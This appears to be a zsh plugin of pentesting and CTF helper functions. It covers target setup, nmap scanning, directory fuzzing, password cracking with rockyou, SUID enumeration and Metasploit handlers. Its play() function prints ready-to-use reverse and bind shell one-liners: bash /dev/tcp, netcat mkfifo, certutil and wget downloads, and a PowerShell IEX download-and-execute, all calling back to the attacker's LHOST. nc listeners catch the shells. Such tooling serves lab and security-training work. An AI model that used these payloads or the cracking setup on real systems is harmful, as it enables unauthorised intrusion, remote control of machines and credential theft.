#!/usr/bin/env zsh

#
# VARIABLES
#

export CONF=~/.tg_hacker
export LIST_COMMON="/usr/share/wordlists/seclists/Discovery/Web-Content/common.txt"
export LIST_MEDIUM="/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"
export LIST_ROCK="/usr/share/wordlists/rockyou.txt"
export SECLISTS="/usr/share/wordlists/seclists"

#
# ALIASES
#

alias f="focus"
alias hcat="h-hashcat"
alias hcatshow="hashcat --show"
alias hi="h-init"
alias hrock="hydra -VI -P $LIST_ROCK"
alias jrock="john --wordlist=$LIST_ROCK"
alias jshow="john --show"
alias msf=msfconsole
alias ngrok="ngrok http 80"
alias p="~/.oh-my-zsh/custom/plugins/tg-hacker/play.py"
alias s='sync'
alias sshclean="ssh-keygen -R rhost; ssh"
alias t1="tree -L 1"
alias t2="tree -L 2"
alias t3="tree -L 3"
alias ve="me tun0"
alias vpn="sudo -b openvpn"
alias vpnkill="sudo pkill openvpn"
alias vpnshow="pgrep -a openvpn"
alias wesng="/opt/wesng/wes.py -c --definitions /opt/wesng/definitions.zip systeminfo.txt"
alias xc="xclip -sel c"


#
# FIND
#

alias find-cap="getcap -r / 2>/dev/null"
alias find-sgid="find / -type f -perm -2000 -ls 2>/dev/null"
alias find-sguid="find / -type f -perm /6000 -ls 2>/dev/null"
alias find-sudo="sudo -l"
alias find-suid="find / -type f -perm -4000 -ls 2>/dev/null"

#
# GREP
#

alias grep-email="grep -E -o '\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,6}\b'"

#
# FUNCTIONS
#

add-host() {
    HOST=${1:="rhost"}
    IP=${2:-$RHOST}
    sudo sed -i /$HOST$/d /etc/hosts
    echo "$IP $HOST" | sudo tee -a /etc/hosts
}

base() {
    if [[ "$1" == "set" ]]; then
        BASE=$(pwd)
        sed -i "/^BASE=/d" $CONF
        echo "BASE=$BASE" >> $CONF
    fi
    echo $BASE
    cd $BASE
}

# Select target ip:port
focus() {
    IP=${1:-"EMPTY"}
    PORT=${2:-"EMPTY"}
    # Set shell variables
    [[ "$IP" != "EMPTY" ]] && export RHOST="$IP"
    [[ "$PORT" != "EMPTY" ]] && export RPORT="$PORT"
    # Add target to hosts file as rhost replacing as necessary
    add-host
    # Add variables to sync $CONF file 
    sed -i "/export RHOST=*/d" $CONF
    echo "export RHOST=$RHOST" >> $CONF
    sed -i "/export RPORT=*/d" $CONF
    echo "export RPORT=$RPORT" >> $CONF
}

play() {
    payloads=( \
        "bash" \
        "certutil" \
        "netcat-bind" \
        "netcat-rev" \
        "ps_download" \
        "ps_downx" \
        "wget"\
    )

    if [ "$@" ]; then
        payload="$1"
    else
        select payload in ${payloads[@]}; do
            payload=$payload
            break;
        done
    fi

    case "$payload" in
        bash) echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1" ;;
        certutil) echo "certutil -urlcache -split -f http://$LHOST/" ;;
        netcat-bind) echo "mkfifo /tmp/f; nc -lvnp $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/" ;;
        netcat-rev)  echo "mkfifo /tmp/f; nc $LHOST $LPORT < /tmp/f | /bin/bash >/tmp/f 2>&1; rm /tmp/f" ;;
        ps_download) echo "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://$LHOST:80/','')\"" ;;
        ps_downx) echo "powershell \"IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:80/shell.ps1')\"" ;;
        wget) echo "wget http://$LHOST:80/" ;;
        *)          
            echo "NOPE" ;;
    esac
} 

# Set local callback port
lport() {
    LPORT=${1:-"4444"} 
    if [[ -f $CONF ]]; then
        sed -i "/export LPORT=*/d" $CONF
        echo "export LPORT=$LPORT" >> $CONF
    fi
    echo "LPORT: $LPORT"
}

listen() {
    [[ -n $LPORT ]] || lport
    if [[ -z "$1" ]]; then
        echo "normal"
        nc -lvnp $LPORT
    else
        echo "rlwrap"
        rlwrap nc -lvnp $LPORT
    fi
}

listen-file() {
    [[ -n "$1" ]] &&  nc -lvp $LPORT > $1
}


# Get ip address of local interface default: eth0
me() {
    iface=${1:-"eth0"}
    export LHOST=$(ifconfig $iface | grep "inet " | cut -b 9- | cut  -d" " -f2)
    echo -n $LHOST | xclip -selection c
    if [[ -f $CONF ]]; then
        sed -i "/export LHOST=*/d" $CONF
        echo "export LHOST=$LHOST" >> $CONF
    fi
    echo "LHOST: $LHOST"
}

# Copy rhost to clipboard
rhost() {
    echo -n $RHOST | xclip -selection c
    echo "RHOST: $RHOST"
}

# Launch python http server in current folder 
serve() {
    PORT=${1:-80}
    DIR=${2:-$(pwd)}
    echo "Serving files from $DIR"
    if type python3 >/dev/null 2>&1; then
       python3 -m http.server "$PORT"
    else
       python -m SimpleHTTPServer "$PORT" 
    fi
}

# Sync env variables from $CONF file
sync() {
    [[ -f $CONF ]] ||  h-init
    . $CONF
    . ~/.oh-my-zsh/custom/plugins/tg-hacker/tg-hacker.plugin.zsh
    cd $BASE
    clear
    [[ "$1" == "-v" ]] && cat $CONF
}

#
# HAK FUNCTIONS
#

# Initialize ctf folder
h-init() {
    BASE=${1:-$(pwd)}
    [[ -d $BASE ]] || mkdir -p $BASE
    cd $BASE
    BASE=$(pwd)
    sed -i "/^BASE=/d" $CONF
    echo "BASE=$BASE" >> $CONF
    touch notes.txt
}

h-enum4linux() {
    OUTPUT="enum4linux.$RHOST"
    enum4linux-ng $RHOST -oA $OUTPUT 
}

h-ffuf(){
    PORT=${1:-80}
    HOST=${2:-$RHOST}
    WORDLIST=${3:-$LIST_COMMON}
    OUTPUT=ffuf.$IP-$PORT.txt
    touch $OUTPUT
    ffuf -w $WORDLIST -u http://$HOST:$PORT/FUZZ -o $OUTPUT -of csv -c 
}

h-gobuster(){
    PORT=${1:-80}
    HOST=${2:-$RHOST}
    WORDLIST=${3:-$LIST_COMMON}
    OUTPUT=gobuster.$IP-$PORT.txt
    touch $OUTPUT
    echo "gobuster dir -t 50 -o $OUTPUT -w $WORDLIST -u http://$HOST:$PORT -x html,php,txt,js,css,py"
    gobuster dir -t 50 -o $OUTPUT -w "$WORDLIST" -u http://"$HOST":"$PORT" -x html,php,txt,js,css,py
}

h-hashcat() {
    ATTACK=${1:-0}
    MODE=${2:-0}
    HASHES=${3:-hashes.txt}
    WORDLIST=${4:-"$LIST_ROCK"}
    OUTPUT="hashcat.txt"
    echo "hashcat -a $ATTACK -m $MODE -o $OUTPUT $HASHES $WORDLIST"
    hashcat -a $ATTACK -m $MODE -o $OUTPUT $HASHES $WORDLIST
}

h-hashcatshow() {
    ATTACK=${1:-0}
    MODE=${2:-0}
    HASHES=${3:-"hashes.txt"}
    WORDLIST=${4:-"$LIST_ROCK"}
    OUTPUT="hashcat.txt"
    echo "hashcat --show -m $MODE $HASHES"
    hashcat --show -m $MODE $HASHES
}

h-ssh() {
    sshclean
    ssh "$@"
}

h-web() {
    PORT=${1:-80}
    IP=${2:-$RHOST}
    OUTPUT=$IP.nikto.txt
    touch $OUTPUT
    whatweb -v -a 3 "$IP:$PORT" | tee $IP.whatweb.txt 
    nikto -host "$IP" -port "$PORT" -output $OUTPUT -Format txt
}

#
# METASPLOIT
#

msf-handle() {
    payloads=( \
        "linux/x64/meterpreter/reverse_tcp" \
        "linux/x64/shell_reverse_tcp" \
        "linux/x86/meterpreter/reverse_tcp" \
        "linux/x86/shell_reverse_tcp" \
        "windows/meterpreter/reverse_tcp" \
        "windows/x64/meterpreter/reverse_tcp" \
    )

    select PAYLOAD in "${payloads[@]}"; do
        echo "msfconsole -x 'use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;'"
        msfconsole -x "use exploit/multi/handler; set LHOST $LHOST; set LPORT $LPORT; set payload $PAYLOAD; run;"
        break;
    done
}


#
# NMAP
#

alias nmap-="sudo nmap -v -n -Pn -T4"
#alias nmap-arp="sudo nmap -v -n -sn -PR"
#alias nmap-basic-all="sudo nmap -v -n -Pn -T4 -p- -oN nmap.basic.all.txt"
#alias nmap-basic="sudo nmap -v -n -Pn -T4 -oN nmap.basic.txt"
#alias nmap-discover="sudo nmap -v -n -T4 -sn -PE -oN"
#alias nmap-discover="sudo nmap -v -sn"
#alias nmap-full-all="sudo nmap -v -n -T4 -A -p- -oN nmap.full.all.txt"
#alias nmap-full="sudo nmap -v -n -T4 -A -oN nmap.full.txt"
#alias nmap-script-all="sudo nmap -v -n -Pn -T4 -sC -sV -p- -oN nmap.script.all.txt"
#alias nmap-script="sudo nmap -v -n -Pn -T4 -sC -sV -oN nmap.script.txt"

#nmap- () { sudo nmap -v -n -Pn -T4 ${1:-$RHOST} }
nmap-arp()        { sudo nmap -v -n -sn -PR              -oN ${1:-$RHOST}-nmap-arp.txt ${1:-$RHOST} }
nmap-basic()      { sudo nmap -v -n -Pn -T4              -oN ${1:-$RHOST}-nmap-basic.txt ${1:-$RHOST} }
nmap-basic-all()  { sudo nmap -v -n -Pn -T4 -p-          -oN ${1:-$RHOST}-nmap-basic-all.txt ${1:-$RHOST} }
nmap-discover()   { sudo nmap -v -n -T4 -sn -PE          -oN ${1:-$RHOST}-nmap-discover.txt ${1:-$RHOST} }
nmap-full()       { sudo nmap -v -n -Pn -T4 -A           -oN ${1:-$RHOST}-nmap-full.txt ${1:-$RHOST} }
nmap-full-all()   { sudo nmap -v -n -Pn -T4 -A -p-       -oN ${1:-$RHOST}-nmap.full.all.txt ${1:-$RHOST} }
nmap-script()     { sudo nmap -v -n -Pn -T4 -sC -sV      -oN ${1:-$RHOST}-nmap.script.txt ${1:-$RHOST} }
nmap-script-all() { sudo nmap -v -n -Pn -T4 -sC -sV -p-  -oN ${1:-$RHOST}-nmap.script.all.txt ${1:-$RHOST} }

nmapper(){
    local ACTION
    local TARGET

    local base="sudo nmap -v -n -Pn -T4"

    PARAMS=""
    while :; do
        case "$1" in
            -a|--action)
                if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
                    ACTION=$2
                    shift 2
                else
                    exit 1
                    echo "Error: Argument for $1 is missing" >&2
                fi
                ;;
            -t|--target)
                if [ -n "$2" ] && [ ${2:0:1} != "-" ]; then
                    TARGET=$2
                    shift 2
                else
                    exit 1
                    echo "Error: Argument for $1 is missing" >&2
                fi
                ;;
            -*|--*=) # unsupported flags
                echo "Error: Unsupported flag $1" >&2
                exit 1
                ;;
            *) # preserve positional arguments
                PARAMS="$PARAMS $1"
                shift
                ;;
        esac
    done
    # set positional arguments in their proper place
    eval set -- "$PARAMS"

    echo "$ACTION $TARGET"


}

nmap-ports(){
    IP=${1:-"$RHOST"}
    sudo nmap -v -Pn -T4 -oN nmap-ports.txt $IP 
    nmap-parse-ports
}

nmap-parse-ports() {
    FILE=${1:-"nmap.ports.txt"} 
    RPORTS=$(cat $FILE | grep -P '^\d+' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//);
    sed -i "/^export RPORTS=*/d" $CONF
    echo "export RPORTS=$RPORTS" >> $CONF
    echo "RPORTS=$RPORTS"
}

